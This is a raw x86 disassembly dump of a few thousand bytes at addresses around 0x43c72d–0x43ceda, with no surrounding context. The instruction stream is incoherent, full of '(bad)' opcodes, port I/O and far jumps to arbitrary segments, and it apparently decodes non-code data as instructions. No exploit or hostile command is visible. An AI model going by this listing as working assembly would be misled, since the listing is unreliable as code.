  43c72d:	mov    ch,0x6a
  43c72f:	mov    edi,0x8eaf1037
  43c734:	add    eax,0x89f24f29
  43c739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c73a:	int3   
  43c73b:	sbb    eax,eax
  43c73d:	dec    esp
  43c73e:	fidiv  DWORD PTR [ebx]
  43c740:	sahf   
  43c741:	cmp    DWORD PTR ds:0x3d5e059c,0xffffffeb
  43c748:	cmp    DWORD PTR [ecx+0x3d6a80bb],esi
  43c74e:	add    BYTE PTR [edi],0xcd
  43c751:	loopne 0x43c75d
  43c753:	in     al,0x22
  43c755:	dec    ecx
  43c756:	cmp    edx,DWORD PTR [ecx+0x57ecb5e0]
  43c75c:	iret   
  43c75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c75e:	mov    eax,DWORD PTR [edx+0x4f4bf405]
  43c764:	ror    DWORD PTR [ebx+0x5268980c],0xbf
  43c76b:	push   esp
  43c76c:	cdq    
  43c76d:	loop   0x43c720
  43c76f:	add    BYTE PTR [ebp+0x47ef2039],ah
  43c775:	cli    
  43c776:	in     al,dx
  43c777:	pop    eax
  43c778:	or     eax,0xb9af45ea
  43c77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c77e:	adc    DWORD PTR [ebx+0x75],edi
  43c781:	shl    DWORD PTR [esi-0x601b5a32],0xe9
  43c788:	repz int 0x31
  43c78b:	inc    ebp
  43c78c:	pop    ss
  43c78d:	or     DWORD PTR [ebp-0x1ea8b402],ebp
  43c793:	out    0x3,al
  43c795:	mov    ds:0x9e78ad5b,al
  43c79a:	push   es
  43c79b:	adc    BYTE PTR [esi+0x74f1f62e],ch
  43c7a1:	pop    ecx
  43c7a2:	mov    bl,0x42
  43c7a4:	mov    dh,0xe6
  43c7a6:	sar    ebp,0xa3
  43c7a9:	cmp    dh,ah
  43c7ab:	loopne 0x43c7c7
  43c7ad:	ss sahf 
  43c7af:	fwait
  43c7b0:	cmp    ah,dh
  43c7b2:	js     0x43c7d9
  43c7b4:	push   es
  43c7b5:	pop    edx
  43c7b6:	(bad)  
  43c7b7:	pop    ss
  43c7b8:	dec    edx
  43c7b9:	xchg   esi,eax
  43c7ba:	mov    ecx,0xb66e824d
  43c7bf:	mov    edi,0x5122d0f1
  43c7c4:	and    eax,0xf82fba0f
  43c7c9:	out    0xc0,eax
  43c7cb:	jmp    0xf1343384
  43c7d0:	int3   
  43c7d1:	mov    eax,0x858bb4bb
  43c7d6:	stc    
  43c7d7:	mov    al,0xd4
  43c7d9:	jo     0x43c7f5
  43c7db:	adc    DWORD PTR [edx-0x416b845a],ebp
  43c7e1:	push   es
  43c7e2:	in     eax,0x80
  43c7e4:	fisub  WORD PTR [ebx-0xe]
  43c7e7:	daa    
  43c7e8:	mov    ah,0xb9
  43c7ea:	daa    
  43c7eb:	aad    0x1e
  43c7ed:	dec    edx
  43c7ee:	push   cs
  43c7ef:	fldcw  WORD PTR [ebx]
  43c7f1:	fwait
  43c7f2:	or     esp,DWORD PTR [eax+0x3a]
  43c7f5:	jno    0x43c851
  43c7f7:	dec    ebx
  43c7f8:	add    BYTE PTR [ebx-0x41c985ce],al
  43c7fe:	jmp    0x14600a07
  43c803:	rep lods eax,DWORD PTR ds:[esi]
  43c805:	mov    al,ds:0x65a5e9fb
  43c80a:	in     al,0x7b
  43c80c:	aas    
  43c80d:	popf   
  43c80e:	adc    DWORD PTR [ecx],ebp
  43c810:	jae    0x43c809
  43c812:	jnp    0x43c88a
  43c814:	dec    ebp
  43c815:	or     dl,ah
  43c817:	mov    dh,cl
  43c819:	imul   edi,DWORD PTR [edi],0xffffffe6
  43c81c:	adc    eax,0x95e64536
  43c821:	cmp    ch,BYTE PTR [ebp-0x46ddef]
  43c827:	scas   al,BYTE PTR es:[edi]
  43c828:	loop   0x43c7d1
  43c82a:	fmul   QWORD PTR [ebx]
  43c82c:	push   edx
  43c82d:	xlat   BYTE PTR ds:[ebx]
  43c82e:	dec    ebx
  43c82f:	inc    ebx
  43c830:	fst    DWORD PTR [ecx-0x49698b31]
  43c836:	outs   dx,BYTE PTR ds:[esi]
  43c837:	shl    BYTE PTR [edx-0x60],1
  43c83a:	xor    bl,al
  43c83c:	ins    DWORD PTR es:[edi],dx
  43c83d:	nop
  43c83e:	in     al,dx
  43c83f:	aam    0x7f
  43c841:	daa    
  43c842:	jmp    0x1b253b1d
  43c847:	pop    ebp
  43c848:	cmc    
  43c849:	ins    BYTE PTR es:[edi],dx
  43c84a:	jo     0x43c840
  43c84c:	fnsave [eax-0x56dd3687]
  43c852:	shl    BYTE PTR [esi-0x59721bbe],cl
  43c858:	xor    BYTE PTR [edx+0x1d94442b],bl
  43c85e:	leave  
  43c85f:	push   0xd99e4e95
  43c864:	jg     0x43c883
  43c866:	mov    ah,0x74
  43c868:	mov    bh,0xa7
  43c86a:	mov    dl,0x4e
  43c86c:	in     eax,0x55
  43c86e:	dec    ebp
  43c86f:	out    0xb7,eax
  43c871:	inc    eax
  43c872:	inc    edx
  43c873:	cmp    DWORD PTR [eax],ecx
  43c875:	or     edx,DWORD PTR [ecx+edx*8-0x75]
  43c879:	pop    ebp
  43c87a:	rcr    DWORD PTR [edi+0x7817bb1d],0x5f
  43c881:	int    0x4b
  43c883:	mov    ?,WORD PTR [ebx]
  43c885:	fucomp st(5)
  43c887:	or     DWORD PTR [ebx+0x2124c915],ebx
  43c88d:	sbb    DWORD PTR [eax*1+0x4789ca6b],edx
  43c894:	adc    DWORD PTR [ecx-0x5f062fa5],ebp
  43c89a:	pop    ecx
  43c89b:	mov    esi,0x3130f306
  43c8a0:	ror    BYTE PTR [ebp-0x5a],cl
  43c8a3:	jne    0x43c91c
  43c8a5:	sub    ebp,ebx
  43c8a7:	jmp    0xd3f6:0x1afa23ba
  43c8ae:	ins    DWORD PTR es:[edi],dx
  43c8af:	cmp    ah,cl
  43c8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c8b2:	adc    edx,DWORD PTR [ecx+ebx*4+0x2747ae49]
  43c8b9:	pop    esi
  43c8ba:	mov    edi,0xf06530d4
  43c8bf:	jb     0x43c916
  43c8c1:	test   DWORD PTR [eax+0x7941ecef],ecx
  43c8c7:	dec    edx
  43c8c8:	sbb    eax,0xc53d9b49
  43c8cd:	imul   edx,edi,0x2c
  43c8d0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  43c8d2:	dec    ebx
  43c8d3:	push   eax
  43c8d4:	(bad)  
  43c8d5:	fwait
  43c8d6:	mov    ecx,0xc0e9c82e
  43c8db:	push   ebp
  43c8dc:	and    ebp,DWORD PTR [ecx]
  43c8de:	mov    dl,0x93
  43c8e0:	push   0x49
  43c8e2:	add    bh,al
  43c8e4:	or     DWORD PTR cs:[esp+ebx*8+0x40],edi
  43c8e9:	jno    0x43c934
  43c8eb:	(bad)  
  43c8ec:	imul   ebp,DWORD PTR [edx],0xffffffb0
  43c8ef:	in     eax,0x23
  43c8f1:	pop    ecx
  43c8f2:	add    cl,BYTE PTR [edx+0x2e]
  43c8f5:	sub    al,0xc3
  43c8f7:	stos   BYTE PTR es:[edi],al
  43c8f8:	mul    BYTE PTR [ecx-0x29b70555]
  43c8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c8ff:	cdq    
  43c900:	pop    esp
  43c901:	sub    eax,0x3603d358
  43c906:	mov    ah,0x84
  43c908:	adc    BYTE PTR [ebp-0x13],cl
  43c90b:	cmp    DWORD PTR ds:0x5eb721c,edx
  43c911:	xchg   DWORD PTR [edx-0x5555195b],eax
  43c917:	fst    DWORD PTR [edi]
  43c919:	and    eax,0x8649f57e
  43c91e:	test   DWORD PTR [ecx-0x3a],esp
  43c921:	dec    esi
  43c922:	(bad)  
  43c923:	fcomp  DWORD PTR [esi]
  43c925:	and    ebx,ebx
  43c927:	add    ebx,DWORD PTR [esi+0xbd153dc]
  43c92d:	cli    
  43c92e:	mov    bh,0x84
  43c930:	jbe    0x43c903
  43c932:	mov    bl,0x89
  43c934:	jne    0x43c8e2
  43c936:	adc    ch,cl
  43c938:	lock ror DWORD PTR [esp+eax*1],1
  43c93c:	sbb    bl,BYTE PTR [ecx]
  43c93e:	xor    al,0xaa
  43c940:	ret    0xfebc
  43c943:	into   
  43c944:	push   esi
  43c945:	mov    eax,ds:0x4ad3d5fb
  43c94a:	cmp    al,0x32
  43c94c:	test   BYTE PTR [ebx],dl
  43c94e:	ins    BYTE PTR es:[edi],dx
  43c94f:	mov    dl,0x8e
  43c951:	dec    ebp
  43c952:	mov    edi,0x4105c8a4
  43c957:	nop
  43c958:	adc    eax,0x69eb7dde
  43c95d:	mov    BYTE PTR [eax+0x5a],dh
  43c960:	imul   ecx,DWORD PTR es:[esi],0x937d8026
  43c967:	je     0x43c989
  43c969:	aad    0x93
  43c96b:	retf   0xbcd5
  43c96e:	add    ch,cl
  43c970:	sar    DWORD PTR [eax+edi*8],cl
  43c973:	push   0x61741919
  43c978:	push   0x9a0011a8
  43c97d:	call   0x110a:0xa1f90e5b
  43c984:	cmp    eax,0xcb59a210
  43c989:	add    al,0x94
  43c98b:	add    eax,0xe6090749
  43c990:	stos   BYTE PTR es:[edi],al
  43c991:	mov    ds:0x605075eb,al
  43c996:	jl     0x43c9b5
  43c998:	jb     0x43c9f9
  43c99a:	repz mov esi,0xb4b8adeb
  43c9a0:	retf   
  43c9a1:	mov    ah,0x8a
  43c9a3:	sub    al,0x57
  43c9a5:	mov    ecx,0x8f45e220
  43c9aa:	dec    edi
  43c9ab:	jmp    0xf920:0x36ea1859
  43c9b2:	pop    ds
  43c9b3:	in     al,dx
  43c9b4:	ja     0x43ca1c
  43c9b6:	les    edx,FWORD PTR [ecx+0x2c4e00ec]
  43c9bc:	jp     0x43c95b
  43c9be:	imul   ebp,ecx,0xffffff88
  43c9c1:	dec    esi
  43c9c2:	setge  BYTE PTR ds:0x7937e1f9
  43c9c9:	xchg   ecx,eax
  43c9ca:	fiadd  WORD PTR [edi-0x110c9d85]
  43c9d0:	in     eax,0x0
  43c9d2:	pop    ss
  43c9d3:	jmp    0x96622442
  43c9d8:	and    edi,DWORD PTR [ecx]
  43c9da:	mov    al,BYTE PTR [edx]
  43c9dc:	rcr    BYTE PTR [esi],cl
  43c9de:	inc    edi
  43c9df:	(bad)  
  43c9e0:	in     eax,dx
  43c9e1:	fwait
  43c9e2:	jbe    0x43c9ea
  43c9e4:	gs std 
  43c9e6:	clc    
  43c9e7:	jmp    0x5920:0x139c8967
  43c9ee:	mov    dh,0x39
  43c9f0:	adc    al,BYTE PTR [ebx-0x5dad15c8]
  43c9f6:	cmp    esi,DWORD PTR [ebp-0x7f]
  43c9f9:	mov    ah,BYTE PTR [ebx+0x34fe520b]
  43c9ff:	aas    
  43ca00:	jo     0x43ca42
  43ca02:	mov    ch,0x74
  43ca04:	mov    BYTE PTR [edi-0x12ca1068],dh
  43ca0a:	mov    al,0xf1
  43ca0c:	cmp    al,BYTE PTR [ebp+edx*4-0x3a96e20a]
  43ca13:	bound  ebp,QWORD PTR [ecx]
  43ca15:	add    al,0x61
  43ca17:	neg    BYTE PTR [eax+eiz*4-0x1b]
  43ca1b:	mov    esp,0x1d4bcbdd
  43ca20:	dec    edi
  43ca21:	push   cs
  43ca22:	mov    al,0xcc
  43ca24:	push   ss
  43ca25:	adc    DWORD PTR ds:0xd8592565,eax
  43ca2b:	enter  0x3734,0x6c
  43ca2f:	cmp    edi,DWORD PTR [esi+0xb]
  43ca32:	pushf  
  43ca33:	mov    ecx,0x93ef442f
  43ca38:	retf   
  43ca39:	sub    ch,ch
  43ca3b:	lock and bl,BYTE PTR [ecx]
  43ca3e:	imul   eax,DWORD PTR [edi-0x26fe49fe],0xffffffa6
  43ca45:	mov    ds:0x385b5bcb,al
  43ca4a:	fidiv  WORD PTR [ebx+0xb]
  43ca4d:	pop    esi
  43ca4e:	in     al,0x99
  43ca50:	mov    eax,es:0x68d9d4bc
  43ca56:	aas    
  43ca57:	loop   0x43c9fe
  43ca59:	repz call 0xda4b:0x2ee78cf2
  43ca61:	sub    al,0xfa
  43ca63:	gs sub eax,0xfbe988c7
  43ca69:	xchg   ebp,ebx
  43ca6b:	xchg   DWORD PTR [ebp-0x5c192006],esp
  43ca71:	sbb    DWORD PTR [edx],eax
  43ca73:	jns    0x43ca0d
  43ca75:	aam    0xed
  43ca77:	ins    BYTE PTR es:[edi],dx
  43ca78:	fwait
  43ca79:	add    DWORD PTR [ebx+0x203d50e4],esi
  43ca7f:	iret   
  43ca80:	inc    ebp
  43ca81:	inc    eax
  43ca82:	addr16 jmp 0x591c:0x382b82d4
  43ca8a:	fcomi  st,st(1)
  43ca8c:	fcmovne st,st(1)
  43ca8e:	ds push ebx
  43ca90:	cli    
  43ca91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ca92:	mov    eax,edi
  43ca94:	fisttp QWORD PTR [esi+0x7dbe058e]
  43ca9a:	into   
  43ca9b:	gs jb  0x43cafd
  43ca9e:	stos   BYTE PTR es:[edi],al
  43ca9f:	add    ebx,DWORD PTR [ecx+ecx*8]
  43caa2:	test   BYTE PTR [esi],dl
  43caa4:	(bad)  
  43caa5:	mov    dh,BYTE PTR [eax]
  43caa7:	cmp    bh,al
  43caa9:	imul   edx,DWORD PTR [ebx+0x37],0x1b39ccc7
  43cab0:	xchg   ebp,eax
  43cab1:	mov    dh,0x92
  43cab3:	repz push ds
  43cab5:	push   ebx
  43cab6:	ss inc esi
  43cab8:	jo     0x43cab6
  43caba:	mov    ecx,0x35ca10e4
  43cabf:	xlat   BYTE PTR ds:[ebx]
  43cac0:	aad    0xc1
  43cac2:	sub    esi,esp
  43cac4:	iret   
  43cac5:	fld1   
  43cac7:	aam    0x18
  43cac9:	jmp    0x7b06c4b1
  43cace:	push   0xfffffff3
  43cad0:	sbb    ecx,DWORD PTR [edx-0x5d0a44e3]
  43cad6:	not    DWORD PTR [esi+0x63f3d778]
  43cadc:	imul   BYTE PTR [ecx]
  43cade:	cmp    eax,0xefb7bcb3
  43cae3:	jo     0x43cb15
  43cae5:	and    dl,BYTE PTR [ecx+eiz*4]
  43cae8:	pop    ds
  43cae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43caea:	sti    
  43caeb:	xor    al,BYTE PTR [edi-0x3c469652]
  43caf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43caf2:	push   ecx
  43caf3:	dec    esi
  43caf4:	js     0x43cb72
  43caf6:	retf   0xfe04
  43caf9:	xchg   ebx,eax
  43cafa:	(bad)  
  43cafd:	out    0xbd,eax
  43caff:	nop
  43cb00:	adc    ah,BYTE PTR [ecx-0x1f273e35]
  43cb06:	outs   dx,BYTE PTR ds:[esi]
  43cb07:	and    DWORD PTR [ecx],0x289902c9
  43cb0d:	(bad)  
  43cb0e:	cmp    al,0x96
  43cb10:	call   0xa5f8:0x3bcffbf4
  43cb17:	push   ds
  43cb18:	in     eax,dx
  43cb19:	adc    eax,0xdee2ebf4
  43cb1e:	imul   eax,DWORD PTR [eax-0x6b],0xddee6f78
  43cb25:	dec    esp
  43cb26:	jmp    DWORD PTR [ecx-0x4c180679]
  43cb2c:	add    eax,0x1ff2b100
  43cb31:	or     BYTE PTR cs:[esi-0x2b4b91a6],0x11
  43cb39:	mov    BYTE PTR [esi+ebx*1],ch
  43cb3c:	jnp    0x43cb3e
  43cb3e:	in     eax,0xe6
  43cb40:	ficom  WORD PTR [eax]
  43cb42:	sbb    eax,0x31260c68
  43cb47:	mov    ebp,eax
  43cb49:	inc    ebx
  43cb4a:	cwde   
  43cb4b:	icebp  
  43cb4c:	adc    eax,0xa5fe0952
  43cb51:	jmp    0x1e4bb207
  43cb56:	in     al,0xc
  43cb58:	mov    BYTE PTR [ecx+0x12],ch
  43cb5b:	fistp  WORD PTR [ebp-0x1698e63]
  43cb61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cb62:	xlat   BYTE PTR ds:[ebx]
  43cb63:	push   eax
  43cb64:	pop    edi
  43cb65:	mov    eax,ds:0x1fc2c4ab
  43cb6a:	test   eax,0x37a0b72c
  43cb6f:	enter  0x121d,0xc8
  43cb73:	je     0x43cb90
  43cb75:	or     dh,BYTE PTR [esi-0x14e57014]
  43cb7b:	lock gs xchg esi,eax
  43cb7e:	int    0xe8
  43cb80:	int    0x29
  43cb82:	jl     0x43cb27
  43cb84:	xor    BYTE PTR [ecx-0x54],ch
  43cb87:	shr    esp,1
  43cb89:	sti    
  43cb8a:	jbe    0x43cb86
  43cb8c:	pop    ss
  43cb8d:	and    BYTE PTR [edx],0x8
  43cb90:	in     eax,0xd3
  43cb92:	xchg   esp,eax
  43cb93:	lock push ss
  43cb95:	xchg   ecx,eax
  43cb96:	inc    edx
  43cb97:	jnp    0x43cbb7
  43cb99:	jmp    0x5840aab1
  43cb9e:	(bad)  
  43cb9f:	mov    ecx,0x136f50c3
  43cba4:	and    al,bh
  43cba6:	mov    edx,0xc84c0c69
  43cbab:	fdivr  DWORD PTR [ebp+0x5bf4b97b]
  43cbb1:	jg     0x43cc21
  43cbb3:	add    eax,0xe6bba3de
  43cbb8:	repnz mov ss,WORD PTR ds:0x3f092a74
  43cbbf:	scas   al,BYTE PTR es:[edi]
  43cbc0:	add    ch,ch
  43cbc2:	addr16 adc eax,0xeff22b75
  43cbc8:	pop    ebp
  43cbc9:	add    ecx,edx
  43cbcb:	or     BYTE PTR [edx+ebp*1-0x4],ah
  43cbcf:	(bad)  
  43cbd0:	icebp  
  43cbd1:	or     DWORD PTR [eax+0x79],esp
  43cbd4:	or     eax,0x710cebfc
  43cbd9:	xor    ah,BYTE PTR [edx]
  43cbdb:	out    dx,al
  43cbdc:	push   cs
  43cbdd:	jmp    0x43cbff
  43cbdf:	call   0x6eb91102
  43cbe4:	mov    cl,0x96
  43cbe6:	xor    dl,BYTE PTR [edi]
  43cbe8:	add    eax,0x3df3b557
  43cbed:	(bad)  
  43cbee:	test   eax,0xef30751a
  43cbf3:	js     0x43cc6c
  43cbf5:	xchg   BYTE PTR [edx+0x2e5f4994],dh
  43cbfb:	sub    esp,DWORD PTR [ecx]
  43cbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cbfe:	(bad)  [ebx+edx*1-0xf]
  43cc02:	and    DWORD PTR [edx+0x6890b465],ecx
  43cc08:	lea    edi,[ecx-0x48]
  43cc0b:	push   edx
  43cc0c:	loop   0x43cc88
  43cc0e:	(bad)  
  43cc0f:	mov    bl,BYTE PTR [ebx-0xa364a27]
  43cc15:	mov    cl,0x3d
  43cc17:	out    0xd9,eax
  43cc19:	bound  esi,QWORD PTR [edi-0x35]
  43cc1c:	stos   BYTE PTR es:[edi],al
  43cc1d:	out    0x89,eax
  43cc1f:	dec    ecx
  43cc20:	sbb    cl,cl
  43cc22:	rol    BYTE PTR [ebx+0x51],0x75
  43cc26:	push   es
  43cc27:	jmp    0xf919:0xadcf414e
  43cc2e:	xchg   ebp,eax
  43cc2f:	push   ebp
  43cc30:	and    dh,BYTE PTR [edx+ecx*2+0x19f92364]
  43cc37:	push   ebp
  43cc38:	std    
  43cc39:	sub    BYTE PTR [edx+0x51],al
  43cc3c:	pop    ebp
  43cc3d:	cmp    ecx,ebx
  43cc3f:	stos   DWORD PTR es:[edi],eax
  43cc40:	xlat   BYTE PTR ds:[ebx]
  43cc41:	imul   BYTE PTR [ecx+0x58]
  43cc44:	push   esi
  43cc45:	push   ebp
  43cc46:	push   0xecc5365b
  43cc4b:	jmp    0x43cc95
  43cc4d:	leave  
  43cc4e:	sbb    al,0x91
  43cc50:	sbb    ecx,0x6a84f8dd
  43cc56:	sti    
  43cc57:	jno    0x43cc66
  43cc59:	cld    
  43cc5a:	jmp    0xa8b981fc
  43cc5f:	out    dx,eax
  43cc60:	ret    0xd3c2
  43cc63:	xor    eax,0xae73791c
  43cc68:	or     DWORD PTR [eax+0x13876119],esp
  43cc6e:	sbb    al,0xb9
  43cc70:	test   al,0x7f
  43cc72:	lods   eax,DWORD PTR ds:[esi]
  43cc73:	and    eax,0xec1b0e2f
  43cc78:	and    ch,BYTE PTR [ecx]
  43cc7a:	aas    
  43cc7b:	jge    0x43cc41
  43cc7d:	cmp    BYTE PTR [ecx-0x14634450],dl
  43cc83:	and    DWORD PTR [ecx-0x47],esi
  43cc86:	dec    esi
  43cc87:	outs   dx,BYTE PTR ds:[esi]
  43cc88:	fucomip st,st(4)
  43cc8a:	fbld   TBYTE PTR ds:0xe5a7f870
  43cc90:	add    DWORD PTR [ebx+0x1a],0xfffffff2
  43cc94:	sbb    BYTE PTR [esp+ecx*8+0x6fda5026],cl
  43cc9b:	xchg   ebx,eax
  43cc9c:	sub    eax,0x1844b696
  43cca1:	stc    
  43cca2:	loopne 0x43cce0
  43cca4:	jne    0x43cccc
  43cca6:	fwait
  43cca7:	dec    ebx
  43cca8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ccaa:	fistp  DWORD PTR [eax]
  43ccac:	xchg   ebx,eax
  43ccad:	adc    ebx,DWORD PTR [esi-0x30123e7f]
  43ccb3:	repz retf 
  43ccb5:	aam    0xbd
  43ccb7:	fs (bad) 
  43ccb9:	shl    BYTE PTR [eax+0x6c],1
  43ccbc:	in     eax,0xa8
  43ccbe:	dec    esp
  43ccbf:	out    dx,al
  43ccc0:	push   ecx
  43ccc1:	in     eax,0xfe
  43ccc3:	sub    eax,0x36da891f
  43ccc8:	dec    ecx
  43ccc9:	jmp    0xeb4bdc49
  43ccce:	bound  esp,QWORD PTR [edx+0x45]
  43ccd1:	enter  0xf1cb,0xca
  43ccd5:	or     ebp,ebp
  43ccd7:	out    0x1e,eax
  43ccd9:	leave  
  43ccda:	addr16 sbb al,0xd9
  43ccdd:	call   0xe45b:0x9dd5c3a5
  43cce4:	dec    eax
  43cce5:	sbb    DWORD PTR [edx+eax*1],edi
  43cce8:	test   BYTE PTR [ebp+ebp*4-0x417e4ea7],ah
  43ccef:	hlt    
  43ccf0:	sub    al,0xc3
  43ccf2:	outs   dx,DWORD PTR ds:[esi]
  43ccf3:	and    DWORD PTR [esi+0x32],0x6920d66f
  43ccfa:	(bad)  
  43ccfb:	not    ecx
  43ccfd:	jae    0x43cd28
  43ccff:	jnp    0x43cd75
  43cd01:	cmp    BYTE PTR [ebx-0x38bf3a1c],bh
  43cd07:	push   esp
  43cd08:	aam    0x36
  43cd0a:	xchg   ebx,eax
  43cd0b:	ror    DWORD PTR [edx],cl
  43cd0d:	out    dx,eax
  43cd0e:	div    dl
  43cd10:	inc    ebp
  43cd11:	shr    DWORD PTR [esi],0xef
  43cd14:	sbb    al,0x8
  43cd16:	stc    
  43cd17:	mov    eax,0x288b5918
  43cd1c:	jge    0x43cd97
  43cd1e:	fadd   QWORD PTR [edx+0x389ba5e5]
  43cd24:	mov    esi,0x472151c2
  43cd29:	inc    edx
  43cd2a:	push   ecx
  43cd2b:	add    BYTE PTR [edi-0x6],ah
  43cd2e:	lods   eax,DWORD PTR ds:[esi]
  43cd2f:	cwde   
  43cd30:	and    cl,cl
  43cd32:	inc    ebp
  43cd33:	mov    esp,0x5a0f4275
  43cd38:	mov    ch,0xb
  43cd3a:	enter  0x83f0,0x55
  43cd3e:	clc    
  43cd3f:	ja     0x43cd5a
  43cd41:	pop    ecx
  43cd42:	xchg   edx,eax
  43cd43:	stc    
  43cd44:	push   esi
  43cd45:	mov    bl,0x98
  43cd47:	jmp    0x43cd45
  43cd49:	test   al,0xeb
  43cd4b:	pop    esi
  43cd4c:	jno    0x43ccfb
  43cd4e:	hlt    
  43cd4f:	(bad)
  43cd52:	fs js  0x43cdd4
  43cd55:	sbb    DWORD PTR [esp+ebx*4+0x1912045a],edx
  43cd5c:	imul   edx,DWORD PTR [esi-0x7ea9640a],0xc086cbf
  43cd66:	sar    DWORD PTR [edx-0x6b344711],cl
  43cd6c:	mov    cl,0x44
  43cd6e:	or     BYTE PTR [ecx],cl
  43cd70:	cdq    
  43cd71:	mov    dl,0xab
  43cd74:	data16 add al,BYTE PTR [ebx]
  43cd77:	mov    al,0xc3
  43cd79:	data16 jno 0x43cdfa
  43cd7c:	sbb    ecx,ecx
  43cd7e:	cmc    
  43cd7f:	repz les ebp,FWORD PTR [eax-0x56996d33]
  43cd86:	cmp    esp,esp
  43cd88:	adc    cl,cl
  43cd8a:	sar    ecx,1
  43cd8c:	dec    ebx
  43cd8d:	imul   eax,DWORD PTR gs:[ebx-0x11f366e1],0x5422d787
  43cd98:	or     ebx,DWORD PTR [ebx+ebx*8+0x2d4057ec]
  43cd9f:	ffreep st(1)
  43cda1:	arpl   WORD PTR [edi-0x4a8f852b],dx
  43cda7:	xor    al,0xca
  43cda9:	out    dx,al
  43cdaa:	in     al,0x1
  43cdac:	mov    ch,0x8e
  43cdae:	jmp    0x47a1:0xc94ff5ee
  43cdb5:	pop    ecx
  43cdb6:	add    dl,BYTE PTR [ebp+ebx*8+0x37]
  43cdba:	xchg   esi,esi
  43cdbc:	and    al,0x1d
  43cdbe:	xor    esi,ebx
  43cdc0:	jmp    0x3cbbc993
  43cdc5:	sbb    ah,0x65
  43cdc8:	xchg   ebx,eax
  43cdc9:	dec    ebx
  43cdca:	adc    esp,DWORD PTR [esp+ecx*8+0x61]
  43cdce:	or     bh,ch
  43cdd0:	adc    edx,ecx
  43cdd2:	dec    edx
  43cdd3:	xor    al,0xad
  43cdd5:	nop
  43cdd6:	stos   BYTE PTR es:[edi],al
  43cdd7:	aaa    
  43cdd8:	push   esp
  43cdd9:	jno    0x43ce55
  43cddb:	sbb    eax,DWORD PTR [eax]
  43cddd:	fiadd  WORD PTR [edx+0x6e]
  43cde0:	sbb    DWORD PTR [eax+eax*4-0x32],eax
  43cde4:	lock gs mov bl,0x5c
  43cde8:	inc    eax
  43cde9:	lods   eax,DWORD PTR ds:[esi]
  43cdea:	nop
  43cdeb:	cmp    dl,ch
  43cded:	les    esi,FWORD PTR [edi-0x66249b5c]
  43cdf3:	(bad)  
  43cdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43cdf5:	ror    ebp,cl
  43cdf7:	repnz cmp BYTE PTR [ebx+0x3919f128],bl
  43cdfe:	fwait
  43cdff:	inc    edx
  43ce00:	pop    esi
  43ce01:	pop    esi
  43ce02:	enter  0x6566,0xfd
  43ce06:	pop    edx
  43ce07:	fdiv   DWORD PTR [ebp-0x34]
  43ce0a:	int    0xe4
  43ce0c:	js     0x43ce2b
  43ce0e:	popf   
  43ce0f:	or     al,0x1d
  43ce11:	or     DWORD PTR [ecx+esi*8+0x55d343f8],edx
  43ce18:	mov    bh,0xa6
  43ce1a:	pop    ebx
  43ce1b:	xor    eax,0xe6c317bc
  43ce20:	retf   0x9eee
  43ce23:	ss jmp 0xfba3:0x7c16f861
  43ce2b:	jne    0x43cdba
  43ce2d:	dec    esi
  43ce2e:	dec    esi
  43ce2f:	hlt    
  43ce30:	add    esp,edx
  43ce32:	jmp    0x43ce14
  43ce34:	jo     0x43ce83
  43ce36:	call   0x622b:0xea80b0e
  43ce3d:	imul   edi,edx,0xb2d7deac
  43ce43:	fs aam 0xb
  43ce46:	xchg   ebx,eax
  43ce47:	jge    0x43ce9e
  43ce49:	inc    ebx
  43ce4a:	repnz out dx,eax
  43ce4c:	popf   
  43ce4d:	push   eax
  43ce4e:	xchg   esp,eax
  43ce4f:	rol    BYTE PTR [ebx-0x471435e9],1
  43ce55:	sub    eax,0x3460d4b8
  43ce5a:	fwait
  43ce5b:	cmp    eax,0xeb2f4fb5
  43ce60:	popf   
  43ce61:	adc    DWORD PTR [ecx],edx
  43ce63:	and    BYTE PTR [eax-0x17],ch
  43ce66:	ja     0x43cead
  43ce68:	xor    esp,ebx
  43ce6a:	adc    esp,eax
  43ce6c:	loop   0x43ce0c
  43ce6e:	imul   eax,DWORD PTR [ebp+0x52c07c14],0x35
  43ce75:	jne    0x43ce16
  43ce77:	in     al,dx
  43ce78:	stos   DWORD PTR es:[edi],eax
  43ce79:	aad    0x52
  43ce7b:	pop    ebx
  43ce7c:	sbb    cl,BYTE PTR [ecx-0x44]
  43ce7f:	and    eax,0xdaa33fa5
  43ce84:	jo     0x43ce2b
  43ce86:	mov    ecx,esp
  43ce88:	pop    esp
  43ce89:	mov    eax,esi
  43ce8b:	std    
  43ce8c:	pop    ebx
  43ce8d:	aam    0xe5
  43ce8f:	mov    ch,0x3a
  43ce91:	push   edi
  43ce92:	xor    eax,0xfffffff5
  43ce95:	mov    ch,0xfe
  43ce97:	repnz popf 
  43ce99:	fucomp st(7)
  43ce9b:	loop   0x43ceb3
  43ce9d:	cdq    
  43ce9e:	test   BYTE PTR [edx-0xd4b15da],dh
  43cea4:	call   0xd5c1:0x25633f79
  43ceab:	mov    edi,ebx
  43cead:	xor    bh,BYTE PTR [edx+0x8]
  43ceb0:	sbb    eax,0x212749e9
  43ceb5:	push   edx
  43ceb6:	(bad)  
  43ceb7:	fld    TBYTE PTR [edx+ebx*4+0x64f85ffb]
  43cebe:	data16 (bad) 
  43cec0:	push   ss
  43cec1:	xchg   BYTE PTR [esi],al
  43cec3:	outs   dx,DWORD PTR ds:[esi]
  43cec4:	cmp    eax,0x9e14bca7
  43cec9:	inc    esi
  43ceca:	push   eax
  43cecb:	jb     0x43cf42
  43cecd:	or     ebx,esi
  43cecf:	icebp  
  43ced0:	adc    eax,edi
  43ced2:	jge    0x43cf05
  43ced4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ced5:	sbb    BYTE PTR [edi],al
  43ced7:	retf   
  43ced8:	cli    
  43ced9:	pop    edx
  43ceda:	mov    ecx,0x848d0f24
